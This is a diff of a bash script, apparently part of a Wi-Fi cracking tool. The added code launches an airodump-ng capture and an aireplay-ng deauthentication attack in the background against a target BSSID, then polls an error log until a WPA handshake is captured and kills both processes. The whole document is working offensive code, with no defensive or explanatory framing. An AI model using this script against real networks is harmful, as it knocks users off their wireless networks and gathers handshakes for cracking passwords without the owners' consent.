@@ -143,6 +143,7 @@ function getMacAP () {
 	fi
 	line="$1"
 	# you can supply variable for awk to program with <<< operator, if you don't sed you will get output that contains '\:' at the end of each field of mac address so you should replace that '\:' with just ':'
+	# this is assigned in some vaiable at caller function
 	awk -F: '{print $1":"$2":"$3":"$4":"$5":"$6}' <<< "$line" | sed 's/\\:/:/g'
 }
 
@@ -163,12 +164,31 @@ function capture_deauth () {
 	fi
 	bssid="$1"
 	channel="$2"
+	adapter="$3"
 
 	# start captuing in sub shell
-	(
+	{
 		cap_file=${bssid:0:3}
-		airodump-ng -c "$channel" --band abg --bssid "$bssid" -w "$cap_file" "$adapter" > cracker//logHandshake
-	)
+		airodump-ng -c "$channel" --band abg --bssid "$bssid" -w "$cap_file" "$adapter" > cracker//logHandshake 2> cracker//errlog
+	} &
+	pid_capture=$!
+
+	# start duauth attack
+	{
+		aireplay-ng --deauth -a "$bssid" "$adapter" &> /dev/null
+	} &
+	pid_deauth=$!
+
+	# wait for handshake or wait till timeout 
+	while true; do
+		if grep "Handshake" cracker//errlog &> /dev/null; then
+			kill "$pid_deauth"
+			kill "$pid_capture"
+			return 0 # capture success, this may be fake authentication capture also,,,
+		fi
+		sleep 1
+	done
+
 }
 
 # continue from here 
